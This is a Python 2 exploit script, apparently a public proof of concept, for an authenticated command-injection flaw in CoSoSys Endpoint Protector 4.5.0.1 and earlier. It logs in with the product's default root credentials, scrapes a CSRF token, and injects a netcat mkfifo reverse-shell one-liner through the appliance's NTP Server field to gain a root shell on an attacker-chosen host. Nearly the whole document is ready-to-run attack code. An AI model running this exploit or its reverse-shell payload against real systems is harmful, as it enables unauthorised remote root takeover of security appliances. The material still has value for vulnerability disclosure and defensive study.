# Title : CoSoSys Endpoint Protector - Authenticated Remote Root Command Injection
# Date : Vulnerability submitted in 01/12/2017 and published in 01/08/2018
# Author : 0x09AL
# Tested on : Endpoint Protector 4.5.0.1
# Software Link : https://www.endpointprotector.com/
# Vulnerable Versions : Endpoint Protector <= 4.5.0.1
# Endpoint Protector suffers from an authenticated command injection vulnerability. By default the username and password are : root:epp2011
# In the Appliance Tab , Server Maintenance the NTP Server field is vulnerable to command injection. There is a call to sh -c {NTP Server field} which is not validated. Attached is the exploit which does this automatically.
# The command may take a while to execute.

import requests
exp = requests.session()
user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0'


username = 'root'
password = 'epp2011'

host = 'x.x.x.x.x'
rev_host = 'x.x.x.x'
rev_port = '443'

r = exp.post('https://%s/index.php/login' % host,data={'username':username,'password':password,'login':'Login'},verify=False)

shell = 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f' % (rev_host,rev_port)

payload = '&& %s' % shell
print payload
if(r.text.find("Welcome Guest")>0):
    print "[-] Incorrect credentials [-]"
else:
    print "[+] Logged in successfully [+]"
    r = exp.get('https://%s/index.php/appliance/maintenance' % host,headers={'X-Requested-With': 'XMLHttpRequest'},verify=False)
    if(r.text.find("csrf")>-1):
        print "[+] Getting CSRF Token [+]"
        csrf_token = r.text.split('value="')[1].split('">')[0]
        
        print "[+] Token: %s [+]" % csrf_token
        post_data = {
            'csrf_token'   : csrf_token,
            'continent'    :'Europe',
            'region'       :'Berlin',
            'timeSetting[ntpserver]'    : payload,
            'timeSetting[timesync]'     :'12'
        }
        r = exp.post('https://%s/index.php/appliance/timezone' % host,data=post_data,headers={'X-Requested-With': 'XMLHttpRequest','Referer': 'https://%s/index.php/' % host},verify=False)
        print "[+] Sending exploit [+]"
        
        if(r.text.find("nc")>-1):
            post_data = {
                'ntpserver': payload,
                'continent'    :'Europe',
                'region'       :'Berlin'
            }

            r = exp.post('https://%s/index.php/appliance/timezone' % host,data=post_data,headers={'X-Requested-With': 'XMLHttpRequest','Referer': 'https://%s/index.php/' % host},verify=False)
            print "[+] Exploit success [+]"